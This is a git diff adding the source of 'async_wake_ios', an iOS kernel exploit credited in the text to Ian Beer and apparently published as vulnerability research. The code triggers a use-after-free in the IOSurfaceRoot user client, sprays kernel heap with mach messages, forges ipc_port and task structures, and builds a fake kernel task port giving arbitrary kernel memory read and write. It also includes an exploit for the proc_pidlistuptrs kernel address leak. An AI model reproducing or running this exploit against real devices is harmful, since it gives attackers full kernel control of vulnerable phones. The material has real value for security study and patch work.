+  void*           outputStruct,
+  size_t*         outputStructCntP);
+
+io_service_t
+IOServiceGetMatchingService(
+  mach_port_t  _masterPort,
+  CFDictionaryRef  matching);
+
+CFMutableDictionaryRef
+IOServiceMatching(
+  const char* name);
+
+kern_return_t
+IOServiceOpen(
+  io_service_t  service,
+  task_port_t   owningTask,
+  uint32_t      type,
+  io_connect_t* connect );
+
+
+/******** end extra headers ***************/
+
+mach_port_t user_client = MACH_PORT_NULL;
+
+// make_dangling will drop an extra reference on port
+// this is the actual bug:
+void make_dangling(mach_port_t port) {
+  kern_return_t err;
+  
+  uint64_t inputScalar[16];
+  uint32_t inputScalarCnt = 0;
+  
+  char inputStruct[4096];
+  size_t inputStructCnt = 0x18;
+  
+  uint64_t* ivals = (uint64_t*)inputStruct;
+  ivals[0] = 1;
+  ivals[1] = 2;
+  ivals[2] = 3;
+  
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+  
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+  
+  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+  
+  uint64_t reference[8] = {0};
+  uint32_t referenceCnt = 1;
+  
+  for (int i = 0; i < 2; i++) {
+    err = IOConnectCallAsyncMethod(
+                                   user_client,
+                                   17,  // s_set_surface_notify
+                                   port,
+                                   reference,
+                                   referenceCnt,
+                                   inputScalar,
+                                   inputScalarCnt,
+                                   inputStruct,
+                                   inputStructCnt,
+                                   outputScalar,
+                                   &outputScalarCnt,
+                                   outputStruct,
+                                   &outputStructCnt);
+    
+    printf("%x\n", err);
+  };
+  
+  err = IOConnectCallMethod(
+                            user_client,
+                            18,  // s_remove_surface_notify
+                            inputScalar,
+                            inputScalarCnt,
+                            inputStruct,
+                            inputStructCnt,
+                            outputScalar,
+                            &outputScalarCnt,
+                            outputStruct,
+                            &outputStructCnt);
+  
+  printf("%x\n", err);
+}
+
+void prepare_user_client() {
+  kern_return_t err;
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+  
+  if (service == IO_OBJECT_NULL){
+    printf(" [-] unable to find service\n");
+    exit(EXIT_FAILURE);
+  }
+  
+  err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
+  if (err != KERN_SUCCESS){
+    printf(" [-] unable to get user client connection\n");
+    exit(EXIT_FAILURE);
+  }
+  
+  printf("got user client: 0x%x\n", user_client);
+}
+
+mach_port_t* prepare_ports(int n_ports) {
+  mach_port_t* ports = malloc(n_ports * sizeof(mach_port_t));
+  for (int i = 0; i < n_ports; i++) {
+    kern_return_t err;
+    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+    if (err != KERN_SUCCESS) {
+      printf(" [-] failed to allocate port\n");
+      exit(EXIT_FAILURE);
+    }
+  }
+  return ports;
+}
+
+void free_ports(mach_port_t* ports, int n_ports) {
+  for (int i = 0; i < n_ports; i++) {
+    mach_port_t port = ports[i];
+    if (port == MACH_PORT_NULL) {
+      continue;
+    }
+    
+    mach_port_destroy(mach_task_self(), port);
+  }
+}
+
+struct simple_msg  {
+  mach_msg_header_t hdr;
+  char buf[0];
+};
+
+mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replacer_body_size) {
+  // allocate a port to send the messages to
+  mach_port_t q = MACH_PORT_NULL;
+  kern_return_t err;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
+  if (err != KERN_SUCCESS) {
+    printf(" [-] failed to allocate port\n");
+    exit(EXIT_FAILURE);
+  }
+  
+  mach_port_limits_t limits = {0};
+  limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
+  err = mach_port_set_attributes(mach_task_self(),
+                                 q,
+                                 MACH_PORT_LIMITS_INFO,
+                                 (mach_port_info_t)&limits,
+                                 MACH_PORT_LIMITS_INFO_COUNT);
+  if (err != KERN_SUCCESS) {
+    printf(" [-] failed to increase queue limit\n");
+    exit(EXIT_FAILURE);
+  }
+  
+  
+  mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
+  struct simple_msg* msg = malloc(msg_size);
+  memset(msg, 0, sizeof(struct simple_msg));
+  memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);
+  
+  for (int i = 0; i < 256; i++) { // was MACH_PORT_QLIMIT_LARGE
+    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+    msg->hdr.msgh_size = msg_size;
+    msg->hdr.msgh_remote_port = q;
+    msg->hdr.msgh_local_port = MACH_PORT_NULL;
+    msg->hdr.msgh_id = 0x41414142;
+    
+    err = mach_msg(&msg->hdr,
+                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                   msg_size,
+                   0,
+                   MACH_PORT_NULL,
+                   MACH_MSG_TIMEOUT_NONE,
+                   MACH_PORT_NULL);
+    
+    if (err != KERN_SUCCESS) {
+      printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
+      exit(EXIT_FAILURE);
+    }
+  }
+  
+  return q;
+}
+
+/*
+ for the given mach message size, how big will the ipc_kmsg structure be?
+ 
+ This is defined in ipc_kmsg_alloc, and it's quite complicated to work it out!
+ 
+ The size is overallocated so that if the message was sent from a 32-bit process
+ they can expand out the 32-bit ool descriptors to the kernel's 64-bit ones, which
+ means that for each descriptor they would need an extra 4 bytes of space for the
+ larger pointer. Except at this point they have no idea what's in the message
+ so they assume the worst case for all messages. This leads to approximately a 30%
+ overhead in the allocation size.
+ 
+ The allocated size also contains space for the maximum trailer plus the ipc_kmsg header.
+ 
+ When the message is actually written into this buffer it's aligned to the end
+ */
+int message_size_for_kalloc_size(int kalloc_size) {
+  return ((3*kalloc_size)/4) - 0x74;
+}
+
+
+/*
+ build a fake task port object to get an arbitrary read
+ 
+ I am basing this on the techniques used in Yalu 10.2 released by
+ @qwertyoruiopz and @marcograss (and documented by Johnathan Levin
+ in *OS Internals Volume III)
+ 
+ There are a few difference here. We have a kernel memory disclosure bug so
+ we know the address the dangling port pointer points to. This means we don't need
+ to point the task to userspace to get a "what+where" primitive since we can just
+ put whatever recursive structure we require in the object which will replace
+ the free'd port.
+ 
+ We can also leverage the fact that we have a dangling mach port pointer
+ to also write to a small area of the dangling port (via mach_port_set_context)
+ 
+ If we build the replacement object (with the fake struct task)
+ correctly we can set it up such that by calling mach_port_set_context we can control
+ where the arbitrary read will read from.
+ 
+ this same method is used again a second time once the arbitrary read works so that the vm_map
+ and receiver can be set correctly turning this into a fake kernel task port.
+ */
+
+uint32_t IO_BITS_ACTIVE = 0x80000000;
+uint32_t IKOT_TASK = 2;
+uint32_t IKOT_NONE = 0;
+
+uint64_t second_port_initial_context = 0x1024204110244201;
+
+uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_body_size, uint32_t message_body_offset, uint64_t vm_map, uint64_t receiver, uint64_t** context_ptr) {
+  uint8_t* body = malloc(message_body_size);
+  memset(body, 0, message_body_size);
+  
+  uint32_t port_page_offset = dangling_port_address & 0xfff;
+  
+  // structure required for the first fake port:
+  uint8_t* fake_port = body + (port_page_offset - message_body_offset);
+
+  
+  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;
+  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references
+  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights
+  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;
+  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = 0x123456789abcdef;
+  
+  *context_ptr = (uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT));
+  
+  
+  // set the kobject pointer such that task->bsd_info reads from ip_context:
+  int fake_task_offset = koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) - koffset(KSTRUCT_OFFSET_TASK_BSD_INFO);
+  
+  uint64_t fake_task_address = dangling_port_address + fake_task_offset;
+  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_address;
+  
+  
+  // when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task
+  // pointer up there it's actually all in the buffer so we can also set the reference count to leak it, let's double check that!
+
+  if (fake_port + fake_task_offset < body) {
+    printf("the maths is wrong somewhere, fake task doesn't fit in message\n");
+    sleep(10);
+    exit(EXIT_FAILURE);
+  }
+
+  uint8_t* fake_task = fake_port + fake_task_offset;
+    
+  // set the ref_count field of the fake task:
+  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
+    
+  // make sure the task is active
+  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
+    
+  // set the vm_map of the fake task:
+  *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
+    
+  // set the task lock type of the fake task's lock:
+  *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
+  return body;
+}
+
+
+/*
+ * the first tpf0 we get still hangs of the dangling port and is backed by a type-confused ipc_kmsg buffer
+ *
+ * use that tfp0 to build a safer one such that we can safely free everything this process created and exit
+ * without leaking memory
+ */
+mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
+  kern_return_t err;
+
+  mach_port_t tfp0 = MACH_PORT_NULL;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp0);
+  if (err != KERN_SUCCESS) {
+    printf("unable to allocate port\n");
+  }
+  
+  // build a fake struct task for the kernel task:
+  //uint64_t fake_kernel_task_kaddr = kmem_alloc_wired(0x4000);
+  uint64_t fake_kernel_task_kaddr = early_kalloc(0x1000);
+  printf("fake_kernel_task_kaddr: %llx\n", fake_kernel_task_kaddr);
+
+  
+  void* fake_kernel_task = malloc(0x1000);
+  memset(fake_kernel_task, 0, 0x1000);
+  *(uint32_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
+  *(uint32_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
+  *(uint64_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
+  *(uint8_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
+  kmemcpy(fake_kernel_task_kaddr, (uint64_t) fake_kernel_task, 0x1000);
+  free(fake_kernel_task);
+  
+  uint32_t fake_task_refs = rk32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));
+  printf("read fake_task_refs: %x\n", fake_task_refs);
+  if (fake_task_refs != 0xd00d) {
+    printf("read back value didn't match...\n");
+  }
+  
+  // now make the changes to the port object to make it a task port:
+  uint64_t port_kaddr = find_port_address(tfp0, MACH_MSG_TYPE_MAKE_SEND);
+  
+  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
+  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
+  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
+  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
+  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  fake_kernel_task_kaddr);
+  
+  // swap our receive right for a send right:
+  uint64_t task_port_addr = task_self_addr();
+  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+  
+  uint32_t port_index = tfp0 >> 8;
+  const int sizeof_ipc_entry_t = 0x18;
+  uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
+
+#define IE_BITS_SEND (1<<16)
+#define IE_BITS_RECEIVE (1<<17)
+  
+  bits &= (~IE_BITS_RECEIVE);
+  bits |= IE_BITS_SEND;
+  
+  wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
+  
+  printf("about to test new tfp0\n");
+  
+  vm_offset_t data_out = 0;
+  mach_msg_type_number_t out_size = 0;
+  err = mach_vm_read(tfp0, vm_map, 0x40, &data_out, &out_size);
+  if (err != KERN_SUCCESS) {
+    printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
+    sleep(3);
+    exit(EXIT_FAILURE);
+  }
+
+  printf("kernel read via second tfp0 port worked?\n");
+  printf("0x%016llx\n", *(uint64_t*)data_out);
+  printf("0x%016llx\n", *(uint64_t*)(data_out+8));
+  printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
+  printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
+  
+  return tfp0;
+}
+
+
+
+// task_self_addr points to the struct ipc_port for our task port
+uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
+  uint64_t struct_task = rk64(task_self_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  
+  while (struct_task != 0) {
+    uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+    
+    uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+    
+    if (pid == 0) {
+      uint64_t vm_map = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+      return vm_map;
+    }
+    
+    struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+  }
+  
+  printf("unable to find kernel task...\n");
+  sleep(10);
+  exit(EXIT_FAILURE);
+}
+
+const uint64_t context_magic   = 0x1214161800000000; // a random constant
+const uint64_t initial_context = 0x1020304015253545; // another random constant
+
+mach_port_t get_kernel_memory_rw() {
+  // offsets are required before we get r/w:
+  offsets_init();
+  
+  kern_return_t err;
+  
+  uint32_t MAX_KERNEL_TRAILER_SIZE = 0x44;
+  uint32_t replacer_body_size = message_size_for_kalloc_size(4096) - sizeof(mach_msg_header_t);
+  uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;
+  
+  printf("message size for kalloc.4096: %d\n", message_size_for_kalloc_size(4096));
+  
+  prepare_user_client();
+  
+  uint64_t task_self = task_self_addr();
+  if (task_self == 0) {
+    printf("unable to disclose address of our task port\n");
+    sleep(10);
+    exit(EXIT_FAILURE);
+  }
+  printf("our task port is at 0x%llx\n", task_self);
+  
+  int n_pre_ports = 100000; //8000
+  mach_port_t* pre_ports = prepare_ports(n_pre_ports);
+  
+  // make a bunch of smaller allocations in a different zone which can be collected later:
+  uint32_t smaller_body_size = message_size_for_kalloc_size(1024) - sizeof(mach_msg_header_t);
+  
+  uint8_t* smaller_body = malloc(smaller_body_size);
+  memset(smaller_body, 'C', smaller_body_size);
+  
+  const int n_smaller_ports = 600; // 150 MB
+  mach_port_t smaller_ports[n_smaller_ports];
+  for (int i = 0; i < n_smaller_ports; i++) {
+    smaller_ports[i] = send_kalloc_message(smaller_body, smaller_body_size);
+  }
+  
+  // now find a suitable port
+  // we'll replace the port with an ipc_kmsg buffer containing controlled data, but we don't
+  // completely control all the data:
+  // specifically we're targetting kalloc.4096 but the message body will only span
+  // xxx448 -> xxxfbc so we want to make sure the port we target is within that range
+  // actually, since we're also putting a fake task struct here and want
+  // the task's bsd_info pointer to overlap with the ip_context field we need a stricter range
+  
+  
+  int ports_to_test = 100;
+  int base = n_pre_ports - 1000;
+
+  mach_port_t first_port = MACH_PORT_NULL;
+  uint64_t first_port_address = 0;
+  
+  for (int i = 0; i < ports_to_test; i++) {
+    mach_port_t candidate_port = pre_ports[base+i];
+    uint64_t candidate_address = find_port_address(candidate_port, MACH_MSG_TYPE_MAKE_SEND);
+    uint64_t page_offset = candidate_address & 0xfff;
+    if (page_offset > 0xa00 && page_offset < 0xe80) { // this range could be wider but there's no need
+      printf("found target port with suitable allocation page offset: 0x%016llx\n", candidate_address);
+      pre_ports[base+i] = MACH_PORT_NULL;
+      first_port = candidate_port;
+      first_port_address = candidate_address;
+      break;
+    }
+  }
+  
+  if (first_port == MACH_PORT_NULL) {
+    printf("unable to find a candidate port with a suitable page offset\n");
+    exit(EXIT_FAILURE);
+  }
+
+  
+  uint64_t* context_ptr = NULL;
+  uint8_t* replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, 0, 0, &context_ptr);
+  printf("replacer_body_size: 0x%x\n", replacer_body_size);
+  printf("message_body_offset: 0x%x\n", message_body_offset);
+  
+  make_dangling(first_port);
+  
+  free_ports(pre_ports, n_pre_ports);
+  
+  // free the smaller ports, they will get gc'd later:
+  for (int i = 0; i < n_smaller_ports; i++) {
+    mach_port_destroy(mach_task_self(), smaller_ports[i]);
+  }
+
+  
+  // now try to get that zone collected and reallocated as something controllable (kalloc.4096):
+
+  const int replacer_ports_limit = 200; // about 200 MB
+  mach_port_t replacer_ports[replacer_ports_limit];
+  memset(replacer_ports, 0, sizeof(replacer_ports));
+  uint32_t i;
+  for (i = 0; i < replacer_ports_limit; i++) {
+    uint64_t context_val = (context_magic)|i;
+    *context_ptr = context_val;
+    replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);
+    
+    // we want the GC to actually finish, so go slow...
+    pthread_yield_np();
+    usleep(10000);
+    printf("%d\n", i);
+  }
+  
+
+  // find out which replacer port it was
+  mach_port_context_t replacer_port_number = 0;
+  err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);
+  if (err != KERN_SUCCESS) {
+    printf("unable to get context: %d %s\n", err, mach_error_string(err));
+    sleep(3);
+    exit(EXIT_FAILURE);
+  }
+  replacer_port_number &= 0xffffffff;
+  if (replacer_port_number >= (uint64_t)replacer_ports_limit) {
+    printf("suspicious context value, something's wrong %lx\n", replacer_port_number);
+    sleep(3);
+    exit(EXIT_FAILURE);
+  }
+  
+  printf("got replaced with replacer port %ld\n", replacer_port_number);
+
+  prepare_rk_via_kmem_read_port(first_port);
+  
+  uint64_t kernel_vm_map = find_kernel_vm_map(task_self);
+  printf("found kernel vm_map: 0x%llx\n", kernel_vm_map);
+  
+  
+  // now free first replacer and put a fake kernel task port there
+  // we need to do this becase the first time around we don't know the address
+  // of ipc_space_kernel which means we can't fake a port owned by the kernel
+  free(replacer_message_body);
+  replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, kernel_vm_map, ipc_space_kernel(), &context_ptr);
+  
+  // free the first replacer
+  mach_port_t replacer_port = replacer_ports[replacer_port_number];
+  replacer_ports[replacer_port_number] = MACH_PORT_NULL;
+  mach_port_destroy(mach_task_self(), replacer_port);
+  
+  const int n_second_replacer_ports = 10;
+  mach_port_t second_replacer_ports[n_second_replacer_ports];
+  
+  for (int i = 0; i < n_second_replacer_ports; i++) {
+    *context_ptr = i;
+    second_replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);
+  }
+  
+  // hopefully that worked the second time too!
+  // check the context:
+  
+  replacer_port_number = 0;
+  err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);
+  if (err != KERN_SUCCESS) {
+    printf("unable to get context: %d %s\n", err, mach_error_string(err));
+    sleep(3);
+    exit(EXIT_FAILURE);
+  }
+  
+  replacer_port_number &= 0xffffffff;
+  if (replacer_port_number >= (uint64_t)n_second_replacer_ports) {
+    printf("suspicious context value, something's wrong %lx\n", replacer_port_number);
+    sleep(3);
+    exit(EXIT_FAILURE);
+  }
+  
+  printf("second time got replaced with replacer port %ld\n", replacer_port_number);
+  
+  // clear up the original replacer ports:
+  for (int i = 0; i < replacer_ports_limit; i++) {
+    mach_port_destroy(mach_task_self(), replacer_ports[i]);
+  }
+  
+  // then clear up the second replacer ports (apart from the one in use)
+  mach_port_t second_replacement_port = second_replacer_ports[replacer_port_number];
+  second_replacer_ports[replacer_port_number] = MACH_PORT_NULL;
+  for (int i = 0; i < n_second_replacer_ports; i++) {
+    mach_port_destroy(mach_task_self(), second_replacer_ports[i]);
+  }
+  
+  printf("will try to read from second port (fake kernel)\n");
+  // try to read some kernel memory using the second port:
+  vm_offset_t data_out = 0;
+  mach_msg_type_number_t out_size = 0;
+  err = mach_vm_read(first_port, kernel_vm_map, 0x40, &data_out, &out_size);
+  if (err != KERN_SUCCESS) {
+    printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
+    sleep(3);
+    exit(EXIT_FAILURE);
+  }
+  
+  printf("kernel read via fake kernel task port worked?\n");
+  printf("0x%016llx\n", *(uint64_t*)data_out);
+  printf("0x%016llx\n", *(uint64_t*)(data_out+8));
+  printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
+  printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
+  
+  prepare_rwk_via_tfp0(first_port);
+  printf("about to build safer tfp0\n");
+  
+  //early_kalloc(0x10000);
+  //return 0;
+  
+  mach_port_t safer_tfp0 = build_safe_fake_tfp0(kernel_vm_map, ipc_space_kernel());
+  prepare_rwk_via_tfp0(safer_tfp0);
+  
+  printf("built safer tfp0\n");
+  printf("about to clear up\n");
+  
+  // can now clean everything up
+  wk32(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_NONE);
+  wk64(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  0);
+  
+  // first port will soon point to freed memory, so neuter it:
+  uint64_t task_port_addr = task_self_addr();
+  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+  
+  uint32_t port_index = first_port >> 8;
+  const int sizeof_ipc_entry_t = 0x18;
+  
+  // remove all rights
+  wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
+  
+  // clear the ipc_port port too
+  wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);
+  
+  mach_port_destroy(mach_task_self(), second_replacement_port);
+  printf("cleared up\n");
+  return safer_tfp0;
+}
+
+
+void go() {
+  mach_port_t tfp0 = get_kernel_memory_rw();
+  printf("tfp0: %x\n", tfp0);
+  
+  if (probably_have_correct_symbols()) {
+    printf("have symbols for this device, testing the kernel debugger...\n");
+    test_kdbg();
+  }
+  return;
+}
diff --git a/async_wake_ios/async_wake.h b/async_wake_ios/async_wake.h
new file mode 100644
index 0000000..af19860
--- /dev/null
+++ b/async_wake_ios/async_wake.h
@@ -0,0 +1,8 @@
+#ifndef async_wake_h
+#define async_wake_h
+
+#include <stdio.h>
+
+void go(void);
+
+#endif /* async_wake_h */
diff --git a/async_wake_ios/early_kalloc.c b/async_wake_ios/early_kalloc.c
new file mode 100644
index 0000000..670bdc9
--- /dev/null
+++ b/async_wake_ios/early_kalloc.c
@@ -0,0 +1,69 @@
+//
+//  early_kalloc.c
+//  async_wake_ios
+//
+//  Created by Ian Beer on 12/11/17.
+//  Copyright © 2017 Ian Beer. All rights reserved.
+//
+
+#include "early_kalloc.h"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <mach/mach.h>
+
+#include "find_port.h"
+#include "kmem.h"
+#include "symbols.h"
+
+extern int message_size_for_kalloc_size(int kalloc_size);
+
+// get a kalloc allocation before we've got a kcall interface to just call it
+uint64_t early_kalloc(int size) {
+  mach_port_t port = MACH_PORT_NULL;
+  kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+  if (err != KERN_SUCCESS) {
+    printf("unable to allocate port\n");
+  }
+  
+  uint64_t port_kaddr = find_port_address(port, MACH_MSG_TYPE_MAKE_SEND);
+  
+  struct simple_msg  {
+    mach_msg_header_t hdr;
+    char buf[0];
+  };
+  
+  mach_msg_size_t msg_size = message_size_for_kalloc_size(size);
+  struct simple_msg* msg = malloc(msg_size);
+  memset(msg, 0, msg_size);
+  
+  msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+  msg->hdr.msgh_size = msg_size;
+  msg->hdr.msgh_remote_port = port;
+  msg->hdr.msgh_local_port = MACH_PORT_NULL;
+  msg->hdr.msgh_id = 0x41414142;
+  
+  err = mach_msg(&msg->hdr,
+                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                 msg_size,
+                 0,
+                 MACH_PORT_NULL,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+  
+  if (err != KERN_SUCCESS) {
+    printf("early kalloc failed to send message\n");
+  }
+  
+  // find the message buffer:
+  
+  uint64_t message_buffer = rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
+  printf("message buffer: %llx\n", message_buffer);
+  
+  // leak the message buffer:
+  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
+  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000); // this is two uint16_ts, msg_count and qlimit
+  
+  
+  return message_buffer;
+}
diff --git a/async_wake_ios/early_kalloc.h b/async_wake_ios/early_kalloc.h
new file mode 100644
index 0000000..f1fdcb8
--- /dev/null
+++ b/async_wake_ios/early_kalloc.h
@@ -0,0 +1,8 @@
+#ifndef early_kalloc_h
+#define early_kalloc_h
+
+#include <stdint.h>
+
+uint64_t early_kalloc(int size);
+
+#endif
diff --git a/async_wake_ios/find_port.c b/async_wake_ios/find_port.c
new file mode 100644
index 0000000..5efbc1c
--- /dev/null
+++ b/async_wake_ios/find_port.c
@@ -0,0 +1,253 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#include <mach/mach.h>
+
+#include "find_port.h"
+#include "kmem.h"
+#include "symbols.h"
+#include "kutils.h"
+
+/*
+ * this is an exploit for the proc_pidlistuptrs bug (P0 issue 1372)
+ *
+ * It will reliably determine the kernel address of a mach port.
+ * Knowing the addresses of ports makes the other UaF exploit much simpler.
+ */
+
+// missing headers
+#define KEVENT_FLAG_WORKLOOP 0x400
+
+typedef uint64_t kqueue_id_t;
+
+struct kevent_qos_s {
+  uint64_t        ident;          /* identifier for this event */
+  int16_t         filter;         /* filter for event */
+  uint16_t        flags;          /* general flags */
+  uint32_t        qos;            /* quality of service when servicing event */
+  uint64_t        udata;          /* opaque user data identifier */
+  uint32_t        fflags;         /* filter-specific flags */
+  uint32_t        xflags;         /* extra filter-specific flags */
+  int64_t         data;           /* filter-specific data */
+  uint64_t        ext[4];         /* filter-specific extensions */
+};
+
+#define PRIVATE
+#include <sys/types.h>
+#include <sys/event.h>
+#include <sys/time.h>
+#include <sys/event.h>
+
+struct kevent_extinfo {
+  struct kevent_qos_s kqext_kev;
+  uint64_t kqext_sdata;
+  int kqext_status;
+  int kqext_sfflags;
+  uint64_t kqext_reserved[2];
+};
+
+extern int kevent_id(uint64_t id, const struct kevent_qos_s *changelist, int nchanges, struct kevent_qos_s *eventlist, int nevents, void *data_out, size_t *data_available, unsigned int flags);
+
+int proc_list_uptrs(pid_t pid, uint64_t *buffer, uint32_t buffersize);
+
+// appends n_events user events onto this process's kevent queue
+static void fill_events(int n_events) {
+  struct kevent_qos_s events_id[] = {{
+    .filter = EVFILT_USER,
+    .ident = 1,
+    .flags = EV_ADD,
+    .udata = 0x2345
+  }};
+  
+  kqueue_id_t id = 0x1234;
+  
+  for (int i = 0; i < n_events; i++) {
+    int err = kevent_id(id, events_id, 1, NULL, 0, NULL, NULL,
+                        KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);
+    
+    if (err != 0) {
+      printf(" [-] failed to enqueue user event\n");
+      exit(EXIT_FAILURE);
+    }
+    
+    events_id[0].ident++;
+  }
+}
+
+int kqueues_allocated = 0;
+
+static void prepare_kqueue() {
+  // ensure there are a large number of events so that kevent_proc_copy_uptrs
+  // always returns a large number
+  if (kqueues_allocated) {
+    return;
+  }
+  fill_events(10000);
+  printf(" [+] prepared kqueue\n");
+  kqueues_allocated = 1;
+}
+
+// will make a kalloc allocation of (count*8)+7
+// and only write to the first (count*8) bytes.
+// the return value is those last 7 bytes uninitialized bytes as a uint64_t
+// (the upper byte will be set to 0)
+static uint64_t try_leak(int count) {
+  int buf_size = (count*8)+7;
+  char* buf = calloc(buf_size+1, 1);
+  
+  int err = proc_list_uptrs(getpid(), (void*)buf, buf_size);
+  
+  if (err == -1) {
+    return 0;
+  }
+  
+  // the last 7 bytes will contain the leaked data:
+  uint64_t last_val = ((uint64_t*)buf)[count]; // we added an extra zero byte in the calloc
+  
+  return last_val;
+}
+
+struct ool_msg  {
+  mach_msg_header_t hdr;
+  mach_msg_body_t body;
+  mach_msg_ool_ports_descriptor_t ool_ports;
+};
+
+// fills a kalloc allocation with count times of target_port's struct ipc_port pointer
+// To cause the kalloc allocation to be free'd mach_port_destroy the returned receive right
